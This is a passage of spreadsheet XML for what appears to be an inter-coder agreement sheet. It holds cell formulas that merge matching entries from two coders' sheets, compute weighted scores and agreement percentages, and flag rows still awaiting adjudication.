        <f>IF(AND(Coder1!L192&amp;""&lt;&gt;"",Coder1!L192&amp;""=Coder2!L192&amp;""),Coder1!L192,"")</f>
        <v/>
      </c>
      <c r="M192" s="14">
        <f>IF(AND(Coder1!M192&amp;""&lt;&gt;"",Coder1!M192&amp;""=Coder2!M192&amp;""),Coder1!M192,"")</f>
        <v/>
      </c>
      <c r="N192" s="14">
        <f>IF(AND(Coder1!N192&amp;""&lt;&gt;"",Coder1!N192&amp;""=Coder2!N192&amp;""),Coder1!N192,"")</f>
        <v/>
      </c>
      <c r="O192" s="14">
        <f>IF(AND(Coder1!O192&amp;""&lt;&gt;"",Coder1!O192&amp;""=Coder2!O192&amp;""),Coder1!O192,"")</f>
        <v/>
      </c>
      <c r="P192" s="14">
        <f>IF(AND(Coder1!P192&amp;""&lt;&gt;"",Coder1!P192&amp;""=Coder2!P192&amp;""),Coder1!P192,"")</f>
        <v/>
      </c>
      <c r="Q192" s="14">
        <f>IF(AND(Coder1!Q192&amp;""&lt;&gt;"",Coder1!Q192&amp;""=Coder2!Q192&amp;""),Coder1!Q192,"")</f>
        <v/>
      </c>
      <c r="R192" s="14">
        <f>IF(AND(Coder1!R192&amp;""&lt;&gt;"",Coder1!R192&amp;""=Coder2!R192&amp;""),Coder1!R192,"")</f>
        <v/>
      </c>
      <c r="S192" s="14">
        <f>IF(AND(Coder1!S192&amp;""&lt;&gt;"",Coder1!S192&amp;""=Coder2!S192&amp;""),Coder1!S192,"")</f>
        <v/>
      </c>
      <c r="T192" s="14">
        <f>IF(AND(Coder1!T192&amp;""&lt;&gt;"",Coder1!T192&amp;""=Coder2!T192&amp;""),Coder1!T192,"")</f>
        <v/>
      </c>
      <c r="U192" s="14">
        <f>IF(AND(Coder1!U192&amp;""&lt;&gt;"",Coder1!U192&amp;""=Coder2!U192&amp;""),Coder1!U192,"")</f>
        <v/>
      </c>
      <c r="V192" s="14">
        <f>IF(AND(Coder1!V192&amp;""&lt;&gt;"",Coder1!V192&amp;""=Coder2!V192&amp;""),Coder1!V192,"")</f>
        <v/>
      </c>
      <c r="W192" s="14">
        <f>IF(AND(Coder1!W192&amp;""&lt;&gt;"",Coder1!W192&amp;""=Coder2!W192&amp;""),Coder1!W192,"")</f>
        <v/>
      </c>
      <c r="X192" s="14">
        <f>IF(AND(Coder1!X192&amp;""&lt;&gt;"",Coder1!X192&amp;""=Coder2!X192&amp;""),Coder1!X192,"")</f>
        <v/>
      </c>
      <c r="Y192" s="14">
        <f>IF(AND(Coder1!Y192&amp;""&lt;&gt;"",Coder1!Y192&amp;""=Coder2!Y192&amp;""),Coder1!Y192,"")</f>
        <v/>
      </c>
      <c r="Z192" s="14">
        <f>IF(AND(Coder1!Z192&amp;""&lt;&gt;"",Coder1!Z192&amp;""=Coder2!Z192&amp;""),Coder1!Z192,"")</f>
        <v/>
      </c>
      <c r="AA192" s="14">
        <f>IF(AND(Coder1!AA192&amp;""&lt;&gt;"",Coder1!AA192&amp;""=Coder2!AA192&amp;""),Coder1!AA192,"")</f>
        <v/>
      </c>
      <c r="AB192" s="14">
        <f>IF(AND(Coder1!AB192&amp;""&lt;&gt;"",Coder1!AB192&amp;""=Coder2!AB192&amp;""),Coder1!AB192,"")</f>
        <v/>
      </c>
      <c r="AC192" s="14">
        <f>IF(AND(Coder1!AC192&amp;""&lt;&gt;"",Coder1!AC192&amp;""=Coder2!AC192&amp;""),Coder1!AC192,"")</f>
        <v/>
      </c>
      <c r="AD192" s="14">
        <f>IF(AND(Coder1!AD192&amp;""&lt;&gt;"",Coder1!AD192&amp;""=Coder2!AD192&amp;""),Coder1!AD192,"")</f>
        <v/>
      </c>
      <c r="AE192" s="14">
        <f>IF(AND(Coder1!AE192&amp;""&lt;&gt;"",Coder1!AE192&amp;""=Coder2!AE192&amp;""),Coder1!AE192,"")</f>
        <v/>
      </c>
      <c r="AF192" s="14">
        <f>IF(AND(Coder1!AF192&amp;""&lt;&gt;"",Coder1!AF192&amp;""=Coder2!AF192&amp;""),Coder1!AF192,"")</f>
        <v/>
      </c>
      <c r="AG192" s="14">
        <f>IF(AND(Coder1!AG192&amp;""&lt;&gt;"",Coder1!AG192&amp;""=Coder2!AG192&amp;""),Coder1!AG192,"")</f>
        <v/>
      </c>
      <c r="AH192" s="14">
        <f>IF(AND(Coder1!AH192&amp;""&lt;&gt;"",Coder1!AH192&amp;""=Coder2!AH192&amp;""),Coder1!AH192,"")</f>
        <v/>
      </c>
      <c r="AI192" s="11">
        <f>IF(COUNT(E192:L192)=0,"",SUM(E192:L192))</f>
        <v/>
      </c>
      <c r="AJ192" s="11">
        <f>IF(AI192="","",N(E192)*3+N(F192)*2+N(G192)*2+N(H192)*2+N(I192)*2+N(J192)*3+N(K192)*3+N(L192)*3)</f>
        <v/>
      </c>
      <c r="AK192" s="11">
        <f>IF(AI192="","",COUNTIF(N192:AG192,1))</f>
        <v/>
      </c>
      <c r="AL192" s="11">
        <f>IF(OR(AJ192="",AJ192=0),"",ROUND(100*(AJ192-AK192)/AJ192,1))</f>
        <v/>
      </c>
      <c r="AM192" s="11">
        <f>IF(AND(Coder1!AN192=1,Coder2!AN192=1),IF(COUNTBLANK(E192:AH192)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN192" s="11">
        <f>IF(AND(Coder1!AN192=1,Coder2!AN192=1),IF(SUMPRODUCT(--(Coder1!E192:AH192&amp;""&lt;&gt;Coder2!E192:AH192&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO192" s="11" t="n"/>
    </row>
    <row r="193">
      <c r="A193" s="11">
        <f>Coder1!A193</f>
        <v/>
      </c>
      <c r="B193" s="11">
        <f>Coder1!B193</f>
        <v/>
      </c>
      <c r="C193" s="11">
        <f>Coder1!C193</f>
        <v/>
      </c>
      <c r="D193" s="11">
        <f>Coder1!D193</f>
        <v/>
      </c>
      <c r="E193" s="14">
        <f>IF(AND(Coder1!E193&amp;""&lt;&gt;"",Coder1!E193&amp;""=Coder2!E193&amp;""),Coder1!E193,"")</f>
        <v/>
      </c>
      <c r="F193" s="14">
        <f>IF(AND(Coder1!F193&amp;""&lt;&gt;"",Coder1!F193&amp;""=Coder2!F193&amp;""),Coder1!F193,"")</f>
        <v/>
      </c>
      <c r="G193" s="14">
        <f>IF(AND(Coder1!G193&amp;""&lt;&gt;"",Coder1!G193&amp;""=Coder2!G193&amp;""),Coder1!G193,"")</f>
        <v/>
      </c>
      <c r="H193" s="14">
        <f>IF(AND(Coder1!H193&amp;""&lt;&gt;"",Coder1!H193&amp;""=Coder2!H193&amp;""),Coder1!H193,"")</f>
        <v/>
      </c>
      <c r="I193" s="14">
        <f>IF(AND(Coder1!I193&amp;""&lt;&gt;"",Coder1!I193&amp;""=Coder2!I193&amp;""),Coder1!I193,"")</f>
        <v/>
      </c>
      <c r="J193" s="14">
        <f>IF(AND(Coder1!J193&amp;""&lt;&gt;"",Coder1!J193&amp;""=Coder2!J193&amp;""),Coder1!J193,"")</f>
        <v/>
      </c>
      <c r="K193" s="14">
        <f>IF(AND(Coder1!K193&amp;""&lt;&gt;"",Coder1!K193&amp;""=Coder2!K193&amp;""),Coder1!K193,"")</f>
        <v/>
      </c>
      <c r="L193" s="14">
        <f>IF(AND(Coder1!L193&amp;""&lt;&gt;"",Coder1!L193&amp;""=Coder2!L193&amp;""),Coder1!L193,"")</f>
        <v/>
      </c>
      <c r="M193" s="14">
        <f>IF(AND(Coder1!M193&amp;""&lt;&gt;"",Coder1!M193&amp;""=Coder2!M193&amp;""),Coder1!M193,"")</f>
        <v/>
      </c>
      <c r="N193" s="14">
        <f>IF(AND(Coder1!N193&amp;""&lt;&gt;"",Coder1!N193&amp;""=Coder2!N193&amp;""),Coder1!N193,"")</f>
        <v/>
      </c>
      <c r="O193" s="14">
        <f>IF(AND(Coder1!O193&amp;""&lt;&gt;"",Coder1!O193&amp;""=Coder2!O193&amp;""),Coder1!O193,"")</f>
        <v/>
      </c>
      <c r="P193" s="14">
        <f>IF(AND(Coder1!P193&amp;""&lt;&gt;"",Coder1!P193&amp;""=Coder2!P193&amp;""),Coder1!P193,"")</f>
        <v/>
      </c>
      <c r="Q193" s="14">
        <f>IF(AND(Coder1!Q193&amp;""&lt;&gt;"",Coder1!Q193&amp;""=Coder2!Q193&amp;""),Coder1!Q193,"")</f>
        <v/>
      </c>
      <c r="R193" s="14">
        <f>IF(AND(Coder1!R193&amp;""&lt;&gt;"",Coder1!R193&amp;""=Coder2!R193&amp;""),Coder1!R193,"")</f>
        <v/>
      </c>
      <c r="S193" s="14">
        <f>IF(AND(Coder1!S193&amp;""&lt;&gt;"",Coder1!S193&amp;""=Coder2!S193&amp;""),Coder1!S193,"")</f>
        <v/>
      </c>
      <c r="T193" s="14">
        <f>IF(AND(Coder1!T193&amp;""&lt;&gt;"",Coder1!T193&amp;""=Coder2!T193&amp;""),Coder1!T193,"")</f>
        <v/>
      </c>
      <c r="U193" s="14">
        <f>IF(AND(Coder1!U193&amp;""&lt;&gt;"",Coder1!U193&amp;""=Coder2!U193&amp;""),Coder1!U193,"")</f>
        <v/>
      </c>
      <c r="V193" s="14">
        <f>IF(AND(Coder1!V193&amp;""&lt;&gt;"",Coder1!V193&amp;""=Coder2!V193&amp;""),Coder1!V193,"")</f>
        <v/>
      </c>
      <c r="W193" s="14">
        <f>IF(AND(Coder1!W193&amp;""&lt;&gt;"",Coder1!W193&amp;""=Coder2!W193&amp;""),Coder1!W193,"")</f>
        <v/>
      </c>
      <c r="X193" s="14">
        <f>IF(AND(Coder1!X193&amp;""&lt;&gt;"",Coder1!X193&amp;""=Coder2!X193&amp;""),Coder1!X193,"")</f>
        <v/>
      </c>
      <c r="Y193" s="14">
        <f>IF(AND(Coder1!Y193&amp;""&lt;&gt;"",Coder1!Y193&amp;""=Coder2!Y193&amp;""),Coder1!Y193,"")</f>
        <v/>
      </c>
      <c r="Z193" s="14">
        <f>IF(AND(Coder1!Z193&amp;""&lt;&gt;"",Coder1!Z193&amp;""=Coder2!Z193&amp;""),Coder1!Z193,"")</f>
        <v/>
      </c>
      <c r="AA193" s="14">
        <f>IF(AND(Coder1!AA193&amp;""&lt;&gt;"",Coder1!AA193&amp;""=Coder2!AA193&amp;""),Coder1!AA193,"")</f>
        <v/>
      </c>
      <c r="AB193" s="14">
        <f>IF(AND(Coder1!AB193&amp;""&lt;&gt;"",Coder1!AB193&amp;""=Coder2!AB193&amp;""),Coder1!AB193,"")</f>
        <v/>
      </c>
      <c r="AC193" s="14">
        <f>IF(AND(Coder1!AC193&amp;""&lt;&gt;"",Coder1!AC193&amp;""=Coder2!AC193&amp;""),Coder1!AC193,"")</f>
        <v/>
      </c>
      <c r="AD193" s="14">
        <f>IF(AND(Coder1!AD193&amp;""&lt;&gt;"",Coder1!AD193&amp;""=Coder2!AD193&amp;""),Coder1!AD193,"")</f>
        <v/>
      </c>
      <c r="AE193" s="14">
        <f>IF(AND(Coder1!AE193&amp;""&lt;&gt;"",Coder1!AE193&amp;""=Coder2!AE193&amp;""),Coder1!AE193,"")</f>
        <v/>
      </c>
      <c r="AF193" s="14">
        <f>IF(AND(Coder1!AF193&amp;""&lt;&gt;"",Coder1!AF193&amp;""=Coder2!AF193&amp;""),Coder1!AF193,"")</f>
        <v/>
      </c>
      <c r="AG193" s="14">
        <f>IF(AND(Coder1!AG193&amp;""&lt;&gt;"",Coder1!AG193&amp;""=Coder2!AG193&amp;""),Coder1!AG193,"")</f>
        <v/>
      </c>
      <c r="AH193" s="14">
        <f>IF(AND(Coder1!AH193&amp;""&lt;&gt;"",Coder1!AH193&amp;""=Coder2!AH193&amp;""),Coder1!AH193,"")</f>
        <v/>
      </c>
      <c r="AI193" s="11">
        <f>IF(COUNT(E193:L193)=0,"",SUM(E193:L193))</f>
        <v/>
      </c>
      <c r="AJ193" s="11">
        <f>IF(AI193="","",N(E193)*3+N(F193)*2+N(G193)*2+N(H193)*2+N(I193)*2+N(J193)*3+N(K193)*3+N(L193)*3)</f>
        <v/>
      </c>
      <c r="AK193" s="11">
        <f>IF(AI193="","",COUNTIF(N193:AG193,1))</f>
        <v/>
      </c>
      <c r="AL193" s="11">
        <f>IF(OR(AJ193="",AJ193=0),"",ROUND(100*(AJ193-AK193)/AJ193,1))</f>
        <v/>
      </c>
      <c r="AM193" s="11">
        <f>IF(AND(Coder1!AN193=1,Coder2!AN193=1),IF(COUNTBLANK(E193:AH193)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN193" s="11">
        <f>IF(AND(Coder1!AN193=1,Coder2!AN193=1),IF(SUMPRODUCT(--(Coder1!E193:AH193&amp;""&lt;&gt;Coder2!E193:AH193&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO193" s="11" t="n"/>
    </row>
    <row r="194">
      <c r="A194" s="11">
        <f>Coder1!A194</f>
        <v/>
      </c>
      <c r="B194" s="11">
        <f>Coder1!B194</f>
        <v/>
      </c>
      <c r="C194" s="11">
        <f>Coder1!C194</f>
        <v/>
      </c>
      <c r="D194" s="11">
        <f>Coder1!D194</f>
        <v/>
      </c>
      <c r="E194" s="14">
        <f>IF(AND(Coder1!E194&amp;""&lt;&gt;"",Coder1!E194&amp;""=Coder2!E194&amp;""),Coder1!E194,"")</f>
        <v/>
      </c>
      <c r="F194" s="14">
        <f>IF(AND(Coder1!F194&amp;""&lt;&gt;"",Coder1!F194&amp;""=Coder2!F194&amp;""),Coder1!F194,"")</f>
        <v/>
      </c>
      <c r="G194" s="14">
        <f>IF(AND(Coder1!G194&amp;""&lt;&gt;"",Coder1!G194&amp;""=Coder2!G194&amp;""),Coder1!G194,"")</f>
        <v/>
      </c>
      <c r="H194" s="14">
        <f>IF(AND(Coder1!H194&amp;""&lt;&gt;"",Coder1!H194&amp;""=Coder2!H194&amp;""),Coder1!H194,"")</f>
        <v/>
      </c>
      <c r="I194" s="14">
        <f>IF(AND(Coder1!I194&amp;""&lt;&gt;"",Coder1!I194&amp;""=Coder2!I194&amp;""),Coder1!I194,"")</f>
        <v/>
      </c>
      <c r="J194" s="14">
        <f>IF(AND(Coder1!J194&amp;""&lt;&gt;"",Coder1!J194&amp;""=Coder2!J194&amp;""),Coder1!J194,"")</f>
        <v/>
      </c>
      <c r="K194" s="14">
        <f>IF(AND(Coder1!K194&amp;""&lt;&gt;"",Coder1!K194&amp;""=Coder2!K194&amp;""),Coder1!K194,"")</f>
        <v/>
      </c>
      <c r="L194" s="14">
        <f>IF(AND(Coder1!L194&amp;""&lt;&gt;"",Coder1!L194&amp;""=Coder2!L194&amp;""),Coder1!L194,"")</f>
        <v/>
      </c>
      <c r="M194" s="14">
        <f>IF(AND(Coder1!M194&amp;""&lt;&gt;"",Coder1!M194&amp;""=Coder2!M194&amp;""),Coder1!M194,"")</f>
        <v/>
      </c>
      <c r="N194" s="14">
        <f>IF(AND(Coder1!N194&amp;""&lt;&gt;"",Coder1!N194&amp;""=Coder2!N194&amp;""),Coder1!N194,"")</f>
        <v/>
      </c>
      <c r="O194" s="14">
        <f>IF(AND(Coder1!O194&amp;""&lt;&gt;"",Coder1!O194&amp;""=Coder2!O194&amp;""),Coder1!O194,"")</f>
        <v/>
      </c>
      <c r="P194" s="14">
        <f>IF(AND(Coder1!P194&amp;""&lt;&gt;"",Coder1!P194&amp;""=Coder2!P194&amp;""),Coder1!P194,"")</f>
        <v/>
      </c>
      <c r="Q194" s="14">
        <f>IF(AND(Coder1!Q194&amp;""&lt;&gt;"",Coder1!Q194&amp;""=Coder2!Q194&amp;""),Coder1!Q194,"")</f>
        <v/>
      </c>
      <c r="R194" s="14">
        <f>IF(AND(Coder1!R194&amp;""&lt;&gt;"",Coder1!R194&amp;""=Coder2!R194&amp;""),Coder1!R194,"")</f>
        <v/>
      </c>
      <c r="S194" s="14">
        <f>IF(AND(Coder1!S194&amp;""&lt;&gt;"",Coder1!S194&amp;""=Coder2!S194&amp;""),Coder1!S194,"")</f>
        <v/>
      </c>
      <c r="T194" s="14">
        <f>IF(AND(Coder1!T194&amp;""&lt;&gt;"",Coder1!T194&amp;""=Coder2!T194&amp;""),Coder1!T194,"")</f>
        <v/>
      </c>
      <c r="U194" s="14">
        <f>IF(AND(Coder1!U194&amp;""&lt;&gt;"",Coder1!U194&amp;""=Coder2!U194&amp;""),Coder1!U194,"")</f>
        <v/>
      </c>
      <c r="V194" s="14">
        <f>IF(AND(Coder1!V194&amp;""&lt;&gt;"",Coder1!V194&amp;""=Coder2!V194&amp;""),Coder1!V194,"")</f>
        <v/>
      </c>
      <c r="W194" s="14">
        <f>IF(AND(Coder1!W194&amp;""&lt;&gt;"",Coder1!W194&amp;""=Coder2!W194&amp;""),Coder1!W194,"")</f>
        <v/>
      </c>
      <c r="X194" s="14">
        <f>IF(AND(Coder1!X194&amp;""&lt;&gt;"",Coder1!X194&amp;""=Coder2!X194&amp;""),Coder1!X194,"")</f>
        <v/>
      </c>
      <c r="Y194" s="14">
        <f>IF(AND(Coder1!Y194&amp;""&lt;&gt;"",Coder1!Y194&amp;""=Coder2!Y194&amp;""),Coder1!Y194,"")</f>
        <v/>
      </c>
      <c r="Z194" s="14">
        <f>IF(AND(Coder1!Z194&amp;""&lt;&gt;"",Coder1!Z194&amp;""=Coder2!Z194&amp;""),Coder1!Z194,"")</f>
        <v/>
      </c>
      <c r="AA194" s="14">
        <f>IF(AND(Coder1!AA194&amp;""&lt;&gt;"",Coder1!AA194&amp;""=Coder2!AA194&amp;""),Coder1!AA194,"")</f>
        <v/>
      </c>
      <c r="AB194" s="14">
        <f>IF(AND(Coder1!AB194&amp;""&lt;&gt;"",Coder1!AB194&amp;""=Coder2!AB194&amp;""),Coder1!AB194,"")</f>
        <v/>
      </c>
      <c r="AC194" s="14">
        <f>IF(AND(Coder1!AC194&amp;""&lt;&gt;"",Coder1!AC194&amp;""=Coder2!AC194&amp;""),Coder1!AC194,"")</f>
        <v/>
      </c>
      <c r="AD194" s="14">
        <f>IF(AND(Coder1!AD194&amp;""&lt;&gt;"",Coder1!AD194&amp;""=Coder2!AD194&amp;""),Coder1!AD194,"")</f>
        <v/>
      </c>
      <c r="AE194" s="14">
        <f>IF(AND(Coder1!AE194&amp;""&lt;&gt;"",Coder1!AE194&amp;""=Coder2!AE194&amp;""),Coder1!AE194,"")</f>
        <v/>
      </c>
      <c r="AF194" s="14">
        <f>IF(AND(Coder1!AF194&amp;""&lt;&gt;"",Coder1!AF194&amp;""=Coder2!AF194&amp;""),Coder1!AF194,"")</f>
        <v/>
      </c>
      <c r="AG194" s="14">
        <f>IF(AND(Coder1!AG194&amp;""&lt;&gt;"",Coder1!AG194&amp;""=Coder2!AG194&amp;""),Coder1!AG194,"")</f>
        <v/>
      </c>
      <c r="AH194" s="14">
        <f>IF(AND(Coder1!AH194&amp;""&lt;&gt;"",Coder1!AH194&amp;""=Coder2!AH194&amp;""),Coder1!AH194,"")</f>
        <v/>
      </c>
      <c r="AI194" s="11">
        <f>IF(COUNT(E194:L194)=0,"",SUM(E194:L194))</f>
        <v/>
      </c>
      <c r="AJ194" s="11">
        <f>IF(AI194="","",N(E194)*3+N(F194)*2+N(G194)*2+N(H194)*2+N(I194)*2+N(J194)*3+N(K194)*3+N(L194)*3)</f>
        <v/>
      </c>
      <c r="AK194" s="11">
        <f>IF(AI194="","",COUNTIF(N194:AG194,1))</f>
        <v/>
      </c>
      <c r="AL194" s="11">
        <f>IF(OR(AJ194="",AJ194=0),"",ROUND(100*(AJ194-AK194)/AJ194,1))</f>
        <v/>
      </c>
      <c r="AM194" s="11">
        <f>IF(AND(Coder1!AN194=1,Coder2!AN194=1),IF(COUNTBLANK(E194:AH194)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN194" s="11">
        <f>IF(AND(Coder1!AN194=1,Coder2!AN194=1),IF(SUMPRODUCT(--(Coder1!E194:AH194&amp;""&lt;&gt;Coder2!E194:AH194&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO194" s="11" t="n"/>
    </row>
    <row r="195">
      <c r="A195" s="11">
        <f>Coder1!A195</f>
        <v/>
      </c>
      <c r="B195" s="11">
        <f>Coder1!B195</f>
        <v/>
      </c>
      <c r="C195" s="11">
        <f>Coder1!C195</f>
        <v/>
      </c>
      <c r="D195" s="11">
        <f>Coder1!D195</f>
        <v/>
      </c>
      <c r="E195" s="14">
        <f>IF(AND(Coder1!E195&amp;""&lt;&gt;"",Coder1!E195&amp;""=Coder2!E195&amp;""),Coder1!E195,"")</f>
        <v/>
      </c>
      <c r="F195" s="14">
        <f>IF(AND(Coder1!F195&amp;""&lt;&gt;"",Coder1!F195&amp;""=Coder2!F195&amp;""),Coder1!F195,"")</f>
        <v/>
      </c>
      <c r="G195" s="14">
        <f>IF(AND(Coder1!G195&amp;""&lt;&gt;"",Coder1!G195&amp;""=Coder2!G195&amp;""),Coder1!G195,"")</f>
        <v/>
      </c>
      <c r="H195" s="14">
        <f>IF(AND(Coder1!H195&amp;""&lt;&gt;"",Coder1!H195&amp;""=Coder2!H195&amp;""),Coder1!H195,"")</f>
        <v/>
      </c>
      <c r="I195" s="14">
        <f>IF(AND(Coder1!I195&amp;""&lt;&gt;"",Coder1!I195&amp;""=Coder2!I195&amp;""),Coder1!I195,"")</f>
        <v/>
      </c>
      <c r="J195" s="14">
        <f>IF(AND(Coder1!J195&amp;""&lt;&gt;"",Coder1!J195&amp;""=Coder2!J195&amp;""),Coder1!J195,"")</f>
        <v/>
      </c>
      <c r="K195" s="14">
        <f>IF(AND(Coder1!K195&amp;""&lt;&gt;"",Coder1!K195&amp;""=Coder2!K195&amp;""),Coder1!K195,"")</f>
        <v/>
      </c>
      <c r="L195" s="14">
        <f>IF(AND(Coder1!L195&amp;""&lt;&gt;"",Coder1!L195&amp;""=Coder2!L195&amp;""),Coder1!L195,"")</f>
        <v/>
      </c>
      <c r="M195" s="14">
        <f>IF(AND(Coder1!M195&amp;""&lt;&gt;"",Coder1!M195&amp;""=Coder2!M195&amp;""),Coder1!M195,"")</f>
        <v/>
      </c>
      <c r="N195" s="14">
        <f>IF(AND(Coder1!N195&amp;""&lt;&gt;"",Coder1!N195&amp;""=Coder2!N195&amp;""),Coder1!N195,"")</f>
        <v/>
      </c>
      <c r="O195" s="14">
        <f>IF(AND(Coder1!O195&amp;""&lt;&gt;"",Coder1!O195&amp;""=Coder2!O195&amp;""),Coder1!O195,"")</f>
        <v/>
      </c>
      <c r="P195" s="14">
        <f>IF(AND(Coder1!P195&amp;""&lt;&gt;"",Coder1!P195&amp;""=Coder2!P195&amp;""),Coder1!P195,"")</f>
        <v/>
      </c>
      <c r="Q195" s="14">
        <f>IF(AND(Coder1!Q195&amp;""&lt;&gt;"",Coder1!Q195&amp;""=Coder2!Q195&amp;""),Coder1!Q195,"")</f>
        <v/>
      </c>
      <c r="R195" s="14">
        <f>IF(AND(Coder1!R195&amp;""&lt;&gt;"",Coder1!R195&amp;""=Coder2!R195&amp;""),Coder1!R195,"")</f>
        <v/>
      </c>
      <c r="S195" s="14">
        <f>IF(AND(Coder1!S195&amp;""&lt;&gt;"",Coder1!S195&amp;""=Coder2!S195&amp;""),Coder1!S195,"")</f>
        <v/>
      </c>
      <c r="T195" s="14">
        <f>IF(AND(Coder1!T195&amp;""&lt;&gt;"",Coder1!T195&amp;""=Coder2!T195&amp;""),Coder1!T195,"")</f>
        <v/>
      </c>
      <c r="U195" s="14">
        <f>IF(AND(Coder1!U195&amp;""&lt;&gt;"",Coder1!U195&amp;""=Coder2!U195&amp;""),Coder1!U195,"")</f>
        <v/>
      </c>
      <c r="V195" s="14">
        <f>IF(AND(Coder1!V195&amp;""&lt;&gt;"",Coder1!V195&amp;""=Coder2!V195&amp;""),Coder1!V195,"")</f>
        <v/>
      </c>
      <c r="W195" s="14">
        <f>IF(AND(Coder1!W195&amp;""&lt;&gt;"",Coder1!W195&amp;""=Coder2!W195&amp;""),Coder1!W195,"")</f>
        <v/>
      </c>
      <c r="X195" s="14">
        <f>IF(AND(Coder1!X195&amp;""&lt;&gt;"",Coder1!X195&amp;""=Coder2!X195&amp;""),Coder1!X195,"")</f>
        <v/>
      </c>
      <c r="Y195" s="14">
        <f>IF(AND(Coder1!Y195&amp;""&lt;&gt;"",Coder1!Y195&amp;""=Coder2!Y195&amp;""),Coder1!Y195,"")</f>
        <v/>
      </c>
      <c r="Z195" s="14">
        <f>IF(AND(Coder1!Z195&amp;""&lt;&gt;"",Coder1!Z195&amp;""=Coder2!Z195&amp;""),Coder1!Z195,"")</f>
        <v/>
      </c>
      <c r="AA195" s="14">
        <f>IF(AND(Coder1!AA195&amp;""&lt;&gt;"",Coder1!AA195&amp;""=Coder2!AA195&amp;""),Coder1!AA195,"")</f>
        <v/>
      </c>
      <c r="AB195" s="14">
        <f>IF(AND(Coder1!AB195&amp;""&lt;&gt;"",Coder1!AB195&amp;""=Coder2!AB195&amp;""),Coder1!AB195,"")</f>
        <v/>
      </c>
      <c r="AC195" s="14">
        <f>IF(AND(Coder1!AC195&amp;""&lt;&gt;"",Coder1!AC195&amp;""=Coder2!AC195&amp;""),Coder1!AC195,"")</f>
        <v/>
      </c>
      <c r="AD195" s="14">
        <f>IF(AND(Coder1!AD195&amp;""&lt;&gt;"",Coder1!AD195&amp;""=Coder2!AD195&amp;""),Coder1!AD195,"")</f>
        <v/>
      </c>
      <c r="AE195" s="14">
        <f>IF(AND(Coder1!AE195&amp;""&lt;&gt;"",Coder1!AE195&amp;""=Coder2!AE195&amp;""),Coder1!AE195,"")</f>
        <v/>
      </c>
      <c r="AF195" s="14">
        <f>IF(AND(Coder1!AF195&amp;""&lt;&gt;"",Coder1!AF195&amp;""=Coder2!AF195&amp;""),Coder1!AF195,"")</f>
        <v/>
      </c>
      <c r="AG195" s="14">
        <f>IF(AND(Coder1!AG195&amp;""&lt;&gt;"",Coder1!AG195&amp;""=Coder2!AG195&amp;""),Coder1!AG195,"")</f>
        <v/>
      </c>
      <c r="AH195" s="14">
        <f>IF(AND(Coder1!AH195&amp;""&lt;&gt;"",Coder1!AH195&amp;""=Coder2!AH195&amp;""),Coder1!AH195,"")</f>
        <v/>
      </c>
      <c r="AI195" s="11">
        <f>IF(COUNT(E195:L195)=0,"",SUM(E195:L195))</f>
        <v/>
      </c>
      <c r="AJ195" s="11">
        <f>IF(AI195="","",N(E195)*3+N(F195)*2+N(G195)*2+N(H195)*2+N(I195)*2+N(J195)*3+N(K195)*3+N(L195)*3)</f>
        <v/>
      </c>
      <c r="AK195" s="11">
        <f>IF(AI195="","",COUNTIF(N195:AG195,1))</f>
        <v/>
      </c>
      <c r="AL195" s="11">
        <f>IF(OR(AJ195="",AJ195=0),"",ROUND(100*(AJ195-AK195)/AJ195,1))</f>
        <v/>
      </c>
      <c r="AM195" s="11">
        <f>IF(AND(Coder1!AN195=1,Coder2!AN195=1),IF(COUNTBLANK(E195:AH195)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN195" s="11">
        <f>IF(AND(Coder1!AN195=1,Coder2!AN195=1),IF(SUMPRODUCT(--(Coder1!E195:AH195&amp;""&lt;&gt;Coder2!E195:AH195&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO195" s="11" t="n"/>
    </row>
    <row r="196">
      <c r="A196" s="11">
        <f>Coder1!A196</f>
        <v/>
      </c>
      <c r="B196" s="11">
        <f>Coder1!B196</f>
        <v/>
      </c>
      <c r="C196" s="11">
        <f>Coder1!C196</f>
        <v/>
      </c>
      <c r="D196" s="11">
        <f>Coder1!D196</f>
        <v/>
      </c>
      <c r="E196" s="14">
        <f>IF(AND(Coder1!E196&amp;""&lt;&gt;"",Coder1!E196&amp;""=Coder2!E196&amp;""),Coder1!E196,"")</f>
        <v/>
      </c>
      <c r="F196" s="14">
        <f>IF(AND(Coder1!F196&amp;""&lt;&gt;"",Coder1!F196&amp;""=Coder2!F196&amp;""),Coder1!F196,"")</f>
        <v/>
      </c>
      <c r="G196" s="14">
        <f>IF(AND(Coder1!G196&amp;""&lt;&gt;"",Coder1!G196&amp;""=Coder2!G196&amp;""),Coder1!G196,"")</f>
        <v/>
      </c>
      <c r="H196" s="14">
        <f>IF(AND(Coder1!H196&amp;""&lt;&gt;"",Coder1!H196&amp;""=Coder2!H196&amp;""),Coder1!H196,"")</f>
        <v/>
      </c>
      <c r="I196" s="14">
        <f>IF(AND(Coder1!I196&amp;""&lt;&gt;"",Coder1!I196&amp;""=Coder2!I196&amp;""),Coder1!I196,"")</f>
        <v/>
      </c>
      <c r="J196" s="14">
        <f>IF(AND(Coder1!J196&amp;""&lt;&gt;"",Coder1!J196&amp;""=Coder2!J196&amp;""),Coder1!J196,"")</f>
        <v/>
      </c>
      <c r="K196" s="14">
        <f>IF(AND(Coder1!K196&amp;""&lt;&gt;"",Coder1!K196&amp;""=Coder2!K196&amp;""),Coder1!K196,"")</f>
        <v/>
      </c>
      <c r="L196" s="14">
        <f>IF(AND(Coder1!L196&amp;""&lt;&gt;"",Coder1!L196&amp;""=Coder2!L196&amp;""),Coder1!L196,"")</f>
        <v/>
      </c>
      <c r="M196" s="14">
        <f>IF(AND(Coder1!M196&amp;""&lt;&gt;"",Coder1!M196&amp;""=Coder2!M196&amp;""),Coder1!M196,"")</f>
        <v/>
      </c>
      <c r="N196" s="14">
        <f>IF(AND(Coder1!N196&amp;""&lt;&gt;"",Coder1!N196&amp;""=Coder2!N196&amp;""),Coder1!N196,"")</f>
        <v/>
      </c>
      <c r="O196" s="14">
